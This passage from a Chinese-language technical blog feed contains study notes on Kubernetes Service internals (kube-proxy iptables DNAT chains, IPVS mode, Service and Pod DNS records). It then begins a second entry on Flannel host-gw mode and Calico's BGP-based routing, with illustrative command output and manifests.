class="hljs-number">10.244.0.5</span>:<span class="hljs-number">9376,10.244</span>.<span class="hljs-number">0.6:9376</span>,<span class="hljs-number">10.244.0.7</span>:<span class="hljs-number">9376</span><br><br></code></pre></td></tr></table></figure><p>需要注意的是，只有处于Running状态，且readinessProbe检查通过的Pod，才会出现在Service的Endpoints列表里。并且，当某一个Pod出现问题时，Kubernetes会自动把它从Service里摘除掉。</p><p>而此时，通过该Service的VIP地址10.0.1.175，就可以访问到它所代理的Pod了：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> kubectl get svc hostnames<br>NAME        <span class="hljs-built_in">TYPE</span>        CLUSTER<span class="hljs-literal">-IP</span>   EXTERNAL<span class="hljs-literal">-IP</span>   PORT(S)   AGE<br>hostnames   ClusterIP   <span class="hljs-number">10.0</span>.<span class="hljs-number">1.175</span>   &lt;none&gt;        <span class="hljs-number">80</span>/TCP    <span class="hljs-number">5</span>s<br><br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">1.175</span>:<span class="hljs-number">80</span><br>hostnames<span class="hljs-literal">-0uton</span><br><br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">1.175</span>:<span class="hljs-number">80</span><br>hostnames<span class="hljs-literal">-yp2kp</span><br><br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">1.175</span>:<span class="hljs-number">80</span><br>hostnames<span class="hljs-literal">-bvc05</span><br><br></code></pre></td></tr></table></figure><p>这个VIP地址是Kubernetes自动为Service分配的。而像上面这样，通过三次连续不断地访问Service的VIP地址和代理端口80，它就为我们依次返回了三个Pod的hostname。这也正印证了Service提供的是Round Robin方式的负载均衡。对于这种方式，我们称为：ClusterIP模式的Service。</p><p>Kubernetes里的Service究竟是如何工作的呢？</p><p>实际上， <strong>Service是由kube-proxy组件，加上iptables来共同实现的。</strong></p><p>对于前面创建的名叫hostnames的Service来说，一旦它被提交给Kubernetes，那么kube-proxy就可以通过Service的Informer感知到这样一个Service对象的添加。而作为对这个事件的响应，它就会在宿主机上创建这样一条iptables规则（你可以通过iptables-save看到它），如下所示：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-A KUBE-SERVICES -d <span class="hljs-number">10.0</span>.<span class="hljs-number">1.175</span>/<span class="hljs-number">32</span> -<span class="hljs-selector-tag">p</span> tcp -m comment <span class="hljs-attr">--comment</span> <span class="hljs-string">&quot;default/hostnames: cluster IP&quot;</span> -m tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j KUBE-SVC-NWV5X2332I4OT4T3<br><br></code></pre></td></tr></table></figure><p>可以看到，这条iptables规则的含义是：凡是目的地址是10.0.1.175、目的端口是80的IP包，都应该跳转到另外一条名叫KUBE-SVC-NWV5X2332I4OT4T3的iptables链进行处理。</p><p>而我们前面已经看到，10.0.1.175正是这个Service的VIP。所以这一条规则，就为这个Service设置了一个固定的入口地址。并且，由于10.0.1.175只是一条iptables规则上的配置，并没有真正的网络设备，所以你ping这个地址，是不会有任何响应的。</p><p>那么，即将跳转到的KUBE-SVC-NWV5X2332I4OT4T3规则，又有什么作用呢？</p><p>实际上，它是一组规则的集合，如下所示：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">-A KUBE-SVC-NWV5X2332I4OT4T3 -m <span class="hljs-built_in">comment</span> --<span class="hljs-built_in">comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -m statistic --mode <span class="hljs-built_in">random</span> --probability <span class="hljs-number">0.33332999982</span> -j KUBE-SEP-WNBA2IHDGP2BOBGZ<br>-A KUBE-SVC-NWV5X2332I4OT4T3 -m <span class="hljs-built_in">comment</span> --<span class="hljs-built_in">comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -m statistic --mode <span class="hljs-built_in">random</span> --probability <span class="hljs-number">0.50000000000</span> -j KUBE-SEP-X3P2623AGDH6CDF3<br>-A KUBE-SVC-NWV5X2332I4OT4T3 -m <span class="hljs-built_in">comment</span> --<span class="hljs-built_in">comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -j KUBE-SEP-<span class="hljs-number">57</span>KPRZ3JQVENLNBR<br><br></code></pre></td></tr></table></figure><p>可以看到，这一组规则，实际上是一组随机模式（–mode random）的iptables链。</p><p>而随机转发的目的地，分别是KUBE-SEP-WNBA2IHDGP2BOBGZ、KUBE-SEP-X3P2623AGDH6CDF3和KUBE-SEP-57KPRZ3JQVENLNBR。</p><p>而这三条链指向的最终目的地，其实就是这个Service代理的三个Pod。所以这一组规则，就是Service实现负载均衡的位置。</p><p>需要注意的是，iptables规则的匹配是从上到下逐条进行的，所以为了保证上述三条规则每条被选中的概率都相同，我们应该将它们的probability字段的值分别设置为1&#x2F;3（0.333…）、1&#x2F;2和1。</p><p>这么设置的原理很简单：第一条规则被选中的概率就是1&#x2F;3；而如果第一条规则没有被选中，那么这时候就只剩下两条规则了，所以第二条规则的probability就必须设置为1&#x2F;2；类似地，最后一条就必须设置为1。</p><p>你可以想一下，如果把这三条规则的probability字段的值都设置成1&#x2F;3，最终每条规则被选中的概率会变成多少。</p><p>通过查看上述三条链的明细，我们就很容易理解Service进行转发的具体原理了，如下所示：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-A KUBE-SEP-<span class="hljs-number">57</span>KPRZ3JQVENLNBR -s <span class="hljs-number">10.244</span>.<span class="hljs-number">3.6</span>/<span class="hljs-number">32</span> -m comment <span class="hljs-attr">--comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -j MARK <span class="hljs-attr">--set-xmark</span> <span class="hljs-number">0</span>x00004000/<span class="hljs-number">0</span>x00004000<br>-A KUBE-SEP-<span class="hljs-number">57</span>KPRZ3JQVENLNBR -<span class="hljs-selector-tag">p</span> tcp -m comment <span class="hljs-attr">--comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -m tcp -j DNAT <span class="hljs-attr">--to-destination</span> <span class="hljs-number">10.244</span>.<span class="hljs-number">3.6</span>:<span class="hljs-number">9376</span><br><br>-A KUBE-SEP-WNBA2IHDGP2BOBGZ -s <span class="hljs-number">10.244</span>.<span class="hljs-number">1.7</span>/<span class="hljs-number">32</span> -m comment <span class="hljs-attr">--comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -j MARK <span class="hljs-attr">--set-xmark</span> <span class="hljs-number">0</span>x00004000/<span class="hljs-number">0</span>x00004000<br>-A KUBE-SEP-WNBA2IHDGP2BOBGZ -<span class="hljs-selector-tag">p</span> tcp -m comment <span class="hljs-attr">--comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -m tcp -j DNAT <span class="hljs-attr">--to-destination</span> <span class="hljs-number">10.244</span>.<span class="hljs-number">1.7</span>:<span class="hljs-number">9376</span><br><br>-A KUBE-SEP-X3P2623AGDH6CDF3 -s <span class="hljs-number">10.244</span>.<span class="hljs-number">2.3</span>/<span class="hljs-number">32</span> -m comment <span class="hljs-attr">--comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -j MARK <span class="hljs-attr">--set-xmark</span> <span class="hljs-number">0</span>x00004000/<span class="hljs-number">0</span>x00004000<br>-A KUBE-SEP-X3P2623AGDH6CDF3 -<span class="hljs-selector-tag">p</span> tcp -m comment <span class="hljs-attr">--comment</span> <span class="hljs-string">&quot;default/hostnames:&quot;</span> -m tcp -j DNAT <span class="hljs-attr">--to-destination</span> <span class="hljs-number">10.244</span>.<span class="hljs-number">2.3</span>:<span class="hljs-number">9376</span><br><br></code></pre></td></tr></table></figure><p>可以看到，这三条链，其实是三条DNAT规则。但在DNAT规则之前，iptables对流入的IP包还设置了一个“标志”（–set-xmark）。这个“标志”的作用，我会在下一篇文章再为你讲解。</p><p>而DNAT规则的作用，就是在PREROUTING检查点之前，也就是在路由之前，将流入IP包的目的地址和端口，改成–to-destination所指定的新的目的地址和端口。可以看到，这个目的地址和端口，正是被代理Pod的IP地址和端口。</p><p>这样，访问Service VIP的IP包经过上述iptables处理之后，就已经变成了访问具体某一个后端Pod的IP包了。不难理解，这些Endpoints对应的iptables规则，正是kube-proxy通过监听Pod的变化事件，在宿主机上生成并维护的。</p><p>以上，就是Service最基本的工作原理。</p><p>此外，Kubernetes的kube-proxy还支持一种叫作<strong>IPVS</strong>的模式。这又是怎么一回事儿呢？</p><p>其实，通过上面的讲解，可以看到，<strong>kube-proxy通过iptables处理Service的过程，其实需要在宿主机上设置相当多的iptables规则。而且，kube-proxy还需要在控制循环里不断地刷新这些规则来确保它们始终是正确的</strong>。</p><p>不难想到，当你的宿主机上有大量Pod的时候，<strong>成百上千条iptables规则不断地被刷新，会大量占用该宿主机的CPU资源，甚至会让宿主机“卡”在这个过程中</strong>。所以说， <strong>一直以来，基于iptables的Service实现，都是制约Kubernetes项目承载更多量级的Pod的主要障碍。</strong></p><p><strong>而IPVS模式的Service，就是解决这个问题的一个行之有效的方法。</strong></p><p>IPVS模式的工作原理，其实跟iptables模式类似。当创建了前面的Service之后，kube-proxy首先会在宿主机上创建一个虚拟网卡（叫作：kube-ipvs0），并为它分配Service VIP作为IP地址，如下所示：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment"># ip addr</span><br>  ...<br>  <span class="hljs-number">73</span>：kube-ipvs0：<span class="hljs-variable">&lt;BROADCAST,NOARP&gt;</span>  mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>  link/ether  <span class="hljs-number">1</span>a:ce:f5:<span class="hljs-number">5</span>f:c1:<span class="hljs-number">4</span>d brd ff:ff:ff:ff:ff:ff<br>  <span class="hljs-keyword">inet</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">1.175</span>/<span class="hljs-number">32</span>  scope <span class="hljs-keyword">global</span> kube-ipvs0<br>  valid_lft forever  preferred_lft forever<br><br></code></pre></td></tr></table></figure><p>而接下来，kube-proxy就会通过Linux的IPVS模块，为这个IP地址设置三个IPVS虚拟主机，并设置这三个虚拟主机之间使用轮询模式(rr)来作为负载均衡策略。我们可以通过ipvsadm查看到这个设置，如下所示：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-comment"># ipvsadm -ln</span><br> IP Virtual Server version 1.2.1 (size=4096)<br>  Prot LocalAddress:Port Scheduler Flags<br>    -&gt;  RemoteAddress:Port           Forward  Weight ActiveConn InActConn<br>  TCP  10.102.128.4:80 rr<br>    -&gt;  10.244.3.6:9376    Masq   <span class="hljs-number"> 1 </span>     <span class="hljs-number"> 0 </span>         0<br>    -&gt;  10.244.1.7:9376    Masq   <span class="hljs-number"> 1 </span>     <span class="hljs-number"> 0 </span>         0<br>    -&gt;  10.244.2.3:9376    Masq   <span class="hljs-number"> 1 </span>     <span class="hljs-number"> 0 </span>         0<br><br></code></pre></td></tr></table></figure><p>可以看到，这三个IPVS虚拟主机的IP地址和端口，对应的正是三个被代理的Pod。</p><p>这时候，任何发往10.102.128.4:80的请求，就都会被IPVS模块转发到某一个后端Pod上了。</p><p>而相比于iptables，IPVS在内核中的实现其实也是<strong>基于Netfilter的NAT模式</strong>，所以在转发这一层上，理论上IPVS并没有显著的性能提升。但是，<strong>IPVS并不需要在宿主机上为每个Pod设置iptables规则，而是把对这些“规则”的处理放到了内核态，从而极大地降低了维护这些规则的代价</strong>。<strong>“将重要操作放入内核态”是提高性能的重要手段。</strong></p><p>不过需要注意的是，<strong>IPVS模块只负责上述的负载均衡和代理功能</strong>。<strong>而一个完整的Service流程正常工作所需要的包过滤、SNAT等操作，还是要靠iptables来实现。只不过，这些辅助性的iptables规则数量有限，也不会随着Pod数量的增加而增加。</strong></p><p>所以，<strong>在大规模集群里，非常建议kube-proxy设置–proxy-mode&#x3D;ipvs来开启这个功能</strong>。它为Kubernetes集群规模带来的提升，还是非常巨大的。</p><p><strong>Service与DNS的关系</strong></p><p>在Kubernetes中，Service和Pod都会被分配对应的DNS A记录（从域名解析IP的记录）。</p><p>对于ClusterIP模式的Service来说（比如我们上面的例子），它的A记录的格式是：..svc.cluster.local。当你访问这条A记录的时候，它解析到的就是该Service的VIP地址。</p><p>而对于指定了clusterIP&#x3D;None的Headless Service来说，它的A记录的格式也是：..svc.cluster.local。但是，当你访问这条A记录的时候，它返回的是所有被代理的Pod的IP地址的集合。当然，如果客户端没办法解析这个集合的话，它可能会只会拿到第一个Pod的IP地址。</p><p>此外，对于ClusterIP模式的Service来说，它代理的Pod被自动分配的A记录的格式是：..pod.cluster.local。这条记录指向Pod的IP地址。</p><p>而对Headless Service来说，它代理的Pod被自动分配的A记录的格式是：…svc.cluster.local。这条记录也指向Pod的IP地址。</p><p>但如果你为Pod指定了Headless Service，并且Pod本身声明了hostname和subdomain字段，那么这时候Pod的A记录就会变成：&lt;pod的hostname&gt;…svc.cluster.local，比如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">default-subdomain</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br>  <span class="hljs-attr">clusterIP:</span> <span class="hljs-string">None</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">foo</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">1234</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">1234</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">busybox1</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">hostname:</span> <span class="hljs-string">busybox-1</span><br>  <span class="hljs-attr">subdomain:</span> <span class="hljs-string">default-subdomain</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox</span><br>    <span class="hljs-attr">command:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">sleep</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3600&quot;</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br><br></code></pre></td></tr></table></figure><p><strong>在上面这个Service和Pod被创建之后，就可以通过busybox-1.default-subdomain.default.svc.cluster.local解析到这个Pod的IP地址了。</strong></p><p>需要注意的是，在Kubernetes里，&#x2F;etc&#x2F;hosts文件是单独挂载的，这也是为什么kubelet能够对hostname进行修改并且Pod重建后依然有效的原因。这跟Docker的Init层是一个原理。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这篇文章里，Service机制，以及Kubernetes里的DNS插件，都是在帮助你解决同样一个问题，即：如何找到我的某一个容器？</p><p>这个问题在平台级项目中，往往就被称作服务发现，即：当我的一个服务（Pod）的IP地址是不固定的且没办法提前获知时，该如何通过一个固定的方式访问到这个Pod呢？</p><p>在这里讲解的、ClusterIP模式的Service为你提供的，就是一个Pod的稳定的IP地址，即VIP。并且，这里Pod和Service的关系是可以通过Label确定的。</p><p>而Headless Service为你提供的，则是一个Pod的稳定的DNS名字，并且，这个名字是可以通过Pod名字和Service名字拼接出来的。</p><p>在实际的场景里，根据自己的具体需求进行合理选择。</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>Kubernetes的Service的负载均衡策略，在iptables和ipvs模式下，都有哪几种？具体工作模式是怎样的？</p><p><strong>ipvs负载均衡类型</strong>：round robin    least connection    destination hashing    source hashing    shortest expected delay    never queue    overflow-connection</p>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cni插件之flannel的host-gw模式与calico</title>
    <link href="/2022/10/29/cni%E6%8F%92%E4%BB%B6%E4%B9%8Bflannel%E7%9A%84host-gw%E6%A8%A1%E5%BC%8F%E4%B8%8Ecalico/"/>
    <url>/2022/10/29/cni%E6%8F%92%E4%BB%B6%E4%B9%8Bflannel%E7%9A%84host-gw%E6%A8%A1%E5%BC%8F%E4%B8%8Ecalico/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># cni插件之flannel的host-gw模式与calico<blockquote><p>本文笔记来自：「深入剖析 Kubernetes课程」，原文链接：<a href="https://time.geekbang.org/column/article/64948">https://time.geekbang.org/column/article/64948</a></p></blockquote><p>先来看一下Flannel的host-gw模式。</p><p><img src="https://static001.geekbang.org/resource/image/3d/25/3d8b08411eeb49be2658eb4352206d25.png?wh=2880*1528" alt="img"></p><p>假设现在，Node 1上的Infra-container-1，要访问Node 2上的Infra-container-2。</p><p>当设置Flannel使用host-gw模式之后，flanneld会在宿主机上创建这样一条规则，以Node 1为例：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$ ip route<br>...<br><span class="hljs-number">10.244.1.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">10</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span> dev eth0<br><br></code></pre></td></tr></table></figure><p>这条路由规则的含义是：目的IP地址属于10.244.1.0&#x2F;24网段的IP包，应该经过本机的eth0设备发出去（即：dev eth0）；并且，它下一跳地址（next-hop）是10.168.0.3（即：via 10.168.0.3）。</p><p>所谓下一跳地址就是：如果IP包从主机A发到主机B，需要经过路由设备X的中转。那么X的IP地址就应该配置为主机A的下一跳地址。</p><p>而从host-gw示意图中我们可以看到，这个下一跳地址对应的，正是我们的目的宿主机Node 2。</p><p>一旦配置了下一跳地址，那么接下来，当IP包从网络层进入链路层封装成帧的时候，eth0设备就会使用下一跳地址对应的MAC地址，作为该数据帧的目的MAC地址。显然，这个MAC地址，正是Node 2的MAC地址。</p><p>这样，这个数据帧就会从Node 1通过宿主机的二层网络顺利到达Node 2上。</p><p>而Node 2的内核网络栈从二层数据帧里拿到IP包后，会“看到”这个IP包的目的IP地址是10.244.1.3，即Infra-container-2的IP地址。这时候，根据Node 2上的路由表，该目的地址会匹配到第二条路由规则（也就是10.244.1.0对应的路由规则），从而进入cni0网桥，进而进入到Infra-container-2当中。</p><p>可以看到， <strong>host-gw模式的工作原理，其实就是将每个Flannel子网（Flannel Subnet，比如：10.244.1.0&#x2F;24）的“下一跳”，设置成了该子网对应的宿主机的IP地址。</strong></p><p>也就是说，这台“主机”（Host）会充当这条容器通信路径里的“网关”（Gateway）。这也正是“host-gw”的含义。</p><p>当然，Flannel子网和主机的信息，都是保存在Etcd当中的。flanneld只需要WACTH这些数据的变化，然后实时更新路由表即可。</p><blockquote><p>注意：在Kubernetes v1.7之后，类似Flannel、Calico的CNI网络插件都是可以直接连接Kubernetes的APIServer来访问Etcd的，无需额外部署Etcd给它们使用。</p></blockquote><p>而在这种模式下，容器通信的过程就免除了额外的封包和解包带来的性能损耗。根据实际的测试，host-gw的性能损失大约在10%左右，而其他所有基于VXLAN“隧道”机制的网络方案，性能损失都在20%~30%左右。</p><p>当然，通过上面的叙述，你也应该看到，host-gw模式能够正常工作的核心，就在于IP包在封装成帧发送出去的时候，会使用路由表里的“下一跳”来设置目的MAC地址。这样，它就会经过二层网络到达目的宿主机。</p><p><strong>所以说，Flannel host-gw模式必须要求集群宿主机之间是二层连通的。</strong></p><p>需要注意的是，宿主机之间二层不连通的情况也是广泛存在的。比如，宿主机分布在了不同的子网（VLAN）里。但是，在一个Kubernetes集群里，宿主机之间必须可以通过IP地址进行通信，也就是说至少是三层可达的。否则的话，你的集群将不满足宿主机之间IP互通的假设（Kubernetes网络模型）。当然，“三层可达”也可以通过为几个子网设置三层转发来实现。</p><p>而在容器生态中，要说到像Flannel host-gw这样的三层网络方案，我们就不得不提到这个领域里的“龙头老大”Calico项目了。</p><p>实际上，Calico项目提供的网络解决方案，与Flannel的host-gw模式，几乎是完全一样的。也就是说，Calico也会在每台宿主机上，添加一个格式如下所示的路由规则：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">&lt;目的容器<span class="hljs-built_in">IP</span>地址段&gt; via &lt;网关的<span class="hljs-built_in">IP</span>地址&gt; dev eth0<br><br></code></pre></td></tr></table></figure><p>其中，网关的IP地址，正是目的容器所在宿主机的IP地址。</p><p>而正如前所述，这个三层网络方案得以正常工作的核心，是为每个容器的IP地址，找到它所对应的、“下一跳”的 <strong>网关</strong>。</p><p>不过， <strong>不同于Flannel通过Etcd和宿主机上的flanneld来维护路由信息的做法，Calico项目使用了一个“重型武器”来自动地在整个集群中分发路由信息。</strong></p><p>这个“重型武器”，就是BGP。</p><p><strong>BGP的全称是Border Gateway Protocol，即：边界网关协议</strong>。它是一个Linux内核原生就支持的、专门用在大规模数据中心里维护不同的“自治系统”之间路由信息的、无中心的路由协议。</p><p>这个概念可能听起来有点儿“吓人”，但实际上，可以用一个非常简单的例子来为你讲清楚。</p><p><img src="https://static001.geekbang.org/resource/image/2e/9b/2e4b3bee1d924f4ae25e2c1fd115379b.jpg?wh=1738*893" alt="img"></p><p>在这个图中，有两个自治系统（Autonomous System，简称为AS）：AS 1和AS 2。而所谓的一个自治系统，指的是一个组织管辖下的所有IP网络和路由器的全体。可以把它想象成一个小公司里的所有主机和路由器。在正常情况下，自治系统之间不会有任何“来往”。</p><p>但是，如果这样两个自治系统里的主机，要通过IP地址直接进行通信，我们就必须使用路由器把这两个自治系统连接起来。</p><p>比如，AS 1里面的主机10.10.0.2，要访问AS 2里面的主机172.17.0.3的话。它发出的IP包，就会先到达自治系统AS 1上的路由器 Router 1。</p><p>而在此时，Router 1的路由表里，有这样一条规则，即：目的地址是172.17.0.2包，应该经过Router 1的C接口，发往网关Router 2（即：自治系统AS 2上的路由器）。</p><p>所以IP包就会到达Router 2上，然后经过Router 2的路由表，从B接口出来到达目的主机172.17.0.3。</p><p>但是反过来，如果主机172.17.0.3要访问10.10.0.2，那么这个IP包，在到达Router 2之后，就不知道该去哪儿了。因为在Router 2的路由表里，并没有关于AS 1自治系统的任何路由规则。</p><p>所以这时候，网络管理员就应该给Router 2也添加一条路由规则，比如：目标地址是10.10.0.2的IP包，应该经过Router 2的C接口，发往网关Router 1。</p><p>像上面这样负责把自治系统连接在一起的路由器，我们就把它形象地称为： <strong>边界网关</strong>。它跟普通路由器的不同之处在于，它的路由表里拥有其他自治系统里的主机路由信息。</p><p>上面的这部分原理，相信你理解起来应该很容易。毕竟，路由器这个设备本身的主要作用，就是连通不同的网络。</p><p>但是，假如网络拓扑结构非常复杂，每个自治系统都有成千上万个主机、无数个路由器，甚至是由多个公司、多个网络提供商、多个自治系统组成的复合自治系统呢？</p><p>这时候，如果还要依靠人工来对边界网关的路由表进行配置和维护，那是绝对不现实的。</p><p>而这种情况下，BGP大显身手的时刻就到了。</p><p>在使用了BGP之后，你可以认为，在每个边界网关上都会运行着一个小程序，它们会将各自的路由表信息，通过TCP传输给其他的边界网关。而其他边界网关上的这个小程序，则会对收到的这些数据进行分析，然后将需要的信息添加到自己的路由表里。</p><p>这样，图2中Router 2的路由表里，就会自动出现10.10.0.2和10.10.0.3对应的路由规则了。</p><p>所以说， <strong>所谓BGP，就是在大规模网络中实现节点路由信息共享的一种协议。</strong></p><p>而BGP的这个能力，正好可以取代Flannel维护主机上路由表的功能。而且，BGP这种原生就是为大规模网络环境而实现的协议，其可靠性和可扩展性，远非Flannel自己的方案可比。</p><blockquote><p>需要注意的是，BGP协议实际上是最复杂的一种路由协议。这里的讲述和所举的例子，仅是为了能够帮助你建立对BGP的感性认识，并不代表BGP真正的实现方式。</p></blockquote><p>在了解了BGP之后，Calico项目的架构就非常容易理解了。它由三个部分组成：</p><ol><li><p>Calico的CNI插件。这是Calico与Kubernetes对接的部分。我已经在上一篇文章中，和你详细分享了CNI插件的工作原理，这里就不再赘述了。</p></li><li><p>Felix。它是一个DaemonSet，负责在宿主机上插入路由规则（即：写入Linux内核的FIB转发信息库），以及维护Calico所需的网络设备等工作。</p></li><li><p>BIRD。它就是BGP的客户端，专门负责在集群里分发路由规则信息。</p></li></ol><p><strong>除了对路由信息的维护方式之外，Calico项目与Flannel的host-gw模式的另一个不同之处，就是它不会在宿主机上创建任何网桥设备</strong>。这时候，Calico的工作方式，可以用一幅示意图来描述，如下所示（在接下来的讲述中，统一用“BGP示意图”来指代它）：</p><p><img src="https://static001.geekbang.org/resource/image/8d/1b/8db6dee96c4242738ae2878e58cecd1b.jpg?wh=1560*836" alt="img"></p><p>其中的绿色实线标出的路径，就是一个IP包从Node 1上的Container 1，到达Node 2上的Container 4的完整路径。</p><p>可以看到，Calico的CNI插件会为每个容器设置一个Veth Pair设备，然后把其中的一端放置在宿主机上（它的名字以cali前缀开头）。</p><p>此外，由于Calico没有使用CNI的网桥模式，Calico的CNI插件还需要在宿主机上为每个容器的Veth Pair设备配置一条路由规则，用于接收传入的IP包。比如，宿主机Node 2上的Container 4对应的路由规则，如下所示：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.233.2.3</span> dev cali5863f3 scope link<br><br></code></pre></td></tr></table></figure><p>即：发往10.233.2.3的IP包，应该进入cali5863f3设备。</p><blockquote><p>基于上述原因，Calico项目在宿主机上设置的路由规则，肯定要比Flannel项目多得多。不过，Flannel host-gw模式使用CNI网桥的主要原因，其实是为了跟VXLAN模式保持一致。否则的话，Flannel就需要维护两套CNI插件了。</p></blockquote><p>有了这样的Veth Pair设备之后，容器发出的IP包就会经过Veth Pair设备出现在宿主机上。然后，宿主机网络栈就会根据路由规则的下一跳IP地址，把它们转发给正确的网关。接下来的流程就跟Flannel host-gw模式完全一致了。</p><p>其中，这里最核心的“下一跳”路由规则，就是由Calico的Felix进程负责维护的。这些路由规则信息，则是通过BGP Client也就是BIRD组件，使用BGP协议传输而来的。</p><p>而这些通过BGP协议传输的消息，可以简单地理解为如下格式：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[BGP消息]</span><br>我是宿主机<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span><br><span class="hljs-number">10.233.2.0</span>/<span class="hljs-number">24</span>网段的容器都在我这里<br>这些容器的下一跳地址是我<br><br></code></pre></td></tr></table></figure><p>不难发现，Calico项目实际上将集群里的所有节点，都当作是边界路由器来处理，它们一起组成了一个全连通的网络，互相之间通过BGP协议交换路由规则。这些节点，我们称为BGP Peer。</p><p>需要注意的是， <strong>Calico维护的网络在默认配置下，是一个被称为“Node-to-Node Mesh”的模式</strong>。这时候，每台宿主机上的BGP Client都需要跟其他所有节点的BGP 